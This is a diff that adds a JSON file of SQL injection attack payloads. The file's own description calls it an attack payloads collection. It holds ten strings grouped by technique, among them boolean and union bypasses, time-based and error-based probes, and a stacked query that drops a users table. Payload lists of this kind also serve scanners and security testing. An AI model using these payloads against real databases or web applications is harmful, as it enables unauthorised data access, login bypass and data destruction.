@@ -1,0 +1,16 @@
+{
+  "version": "1.0.0",
+  "description": "SQL Injection attack payloads collection",
+  "payloads": [
+    {"name": "Basic OR", "payload": "' OR '1'='1", "technique": "boolean"},
+    {"name": "Basic AND", "payload": "' AND '1'='1", "technique": "boolean"},
+    {"name": "Union Select", "payload": "' UNION SELECT NULL--", "technique": "union"},
+    {"name": "Union Multi", "payload": "' UNION SELECT NULL,NULL,NULL--", "technique": "union"},
+    {"name": "Time MySQL", "payload": "' AND SLEEP(5)--", "technique": "time"},
+    {"name": "Time PostgreSQL", "payload": "' AND pg_sleep(5)--", "technique": "time"},
+    {"name": "Error MySQL", "payload": "' AND extractvalue(1,concat(0x7e,database()))--", "technique": "error"},
+    {"name": "Stacked Query", "payload": "'; DROP TABLE users--", "technique": "stacked"},
+    {"name": "Comment Injection", "payload": "1'/**/AND/**/1=1--", "technique": "boolean"},
+    {"name": "Encoded Payload", "payload": "%27%20OR%20%271%27=%271", "technique": "boolean"}
+  ]
+}
